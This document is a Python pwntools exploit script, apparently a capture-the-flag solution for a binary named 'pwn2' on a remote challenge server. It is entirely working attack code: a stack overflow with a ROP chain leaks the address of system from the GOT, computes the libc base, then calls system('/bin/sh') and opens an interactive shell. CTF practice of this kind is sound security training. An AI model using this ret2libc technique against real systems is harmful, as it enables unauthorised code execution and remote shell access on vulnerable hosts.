#!/usr/bin/env python3

from pwn import *

elf = ELF("./pwn2")
# ld = ELF("./ld-2.34.so")
rop = ROP("./pwn2")
context.binary = elf

if args.REMOTE:
    exe = remote('challs.n00bzunit3d.xyz', 61223) 
else:
    exe = process([elf.path]) 

if args.GDB:
    gdb.attach(exe)
offset = 32

rop.call(rop.find_gadget(['ret'])[0])
rop.call(elf.symbols['puts'], [elf.got['system']])
rop.call(elf.symbols['main'])



payload = b'a'*offset + rop.chain()

log.info(rop.dump())
print(exe.recvline())
print(exe.sendline(b'b'))
print(exe.recvline()  )
print(exe.recvline())

exe.sendline(payload)

print(exe.recvuntil('}'))  

if not (args.REMOTE):
    print(exe.recvline())

leak = u64(exe.recvline().strip().ljust(8, b'\x00'))
log.info('done')

log.info(f'{hex(leak)=}')
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
libc.address = leak - libc.sym['system']

ropl = ROP(libc, checksec=False)

log.info(f'{hex(leak)=}')
log.info(f'{hex(libc.address)=}')

system = leak + 27

bin_sh =  next(libc.search(b'/bin/sh'))

ropl.call(ropl.find_gadget(['ret'])[0])
ropl.call(system, [bin_sh])

payload2 = b'a'*offset + ropl.chain()


log.info(ropl.dump())

exe.sendlineafter('?', b'b')

exe.sendlineafter('?', payload2)


exe.interactive()
